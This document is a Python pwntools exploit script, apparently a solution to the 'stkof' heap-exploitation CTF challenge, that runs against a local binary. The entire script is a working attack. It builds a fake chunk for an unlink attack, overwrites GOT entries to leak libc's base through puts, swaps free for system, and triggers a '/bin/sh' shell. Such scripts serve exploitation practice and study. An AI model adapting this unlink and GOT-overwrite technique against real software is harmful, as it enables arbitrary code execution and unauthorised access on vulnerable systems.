#!/usr/bin/python
from pwn import *
context(log_level='debug')

p=process('./stkof')
elf=ELF('./stkof')
libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def malloc(size):
    p.sendline('1')
    p.sendline(str(size))
    idx=p.recvline()
    p.recvline()
    return idx

def puts(got):
    p.sendline('1')
    p.sendline(got)

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))
    data=p.recvline()
    return data

def write(idx,size,content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvline()

def check(idx):
    p.sendline('4')
    p.sendline(str(idx))
    res=p.recvline()
    p.recvline()
    return res


chunk_ptra=0x0000000000602140

#leak
#leak main_arena ptr/leak got puts(got) 
#test puts(got)=>free(xx) limit param<0x10000 so malloc(xx)=>puts(xx)
malloc(0x20) #1


#guess one failed,can't trig double free
#trig unlink
#malloc(0x20) #2
#malloc(0x80) #3
#can't double free
#free(2)  #free will change ptr=0
#malloc(0x400) #4 
#free(2)
atoi_got=elf.got['atoi']
free_got=elf.got['free']
puts_plt=elf.plt['puts']
system_offset=libc.symbols['system']
atoi_offset=libc.symbols['atoi']

malloc(0x80) #2
malloc(0x80) #3
malloc(0x80) #4
#change idx 2
payload=p64(0)+p64(0x80)+p64(chunk_ptra+0x10-0x18)+p64(chunk_ptra+0x10-0x10)
payload+=p64(0)*12+p64(0x80)+p64(0x90)
write(2,len(payload),payload)
free(3)
payload=p64(0)*2+p64(atoi_got)+p64(free_got)
write(2,len(payload),payload)
payload=p64(puts_plt)
write(2,len(payload),payload)
leak=free(1)# 1 pointer 2 got atoi
libc_base=u64(leak[:6].ljust(8,"\x00"))-atoi_offset
print hex(libc_base)
system=libc_base+system_offset
malloc(0x80)
payload='/bin/sh\x00'
write(4,len(payload),payload)
payload=p64(system)
write(2,len(payload),payload)
free(4)
p.interactive()
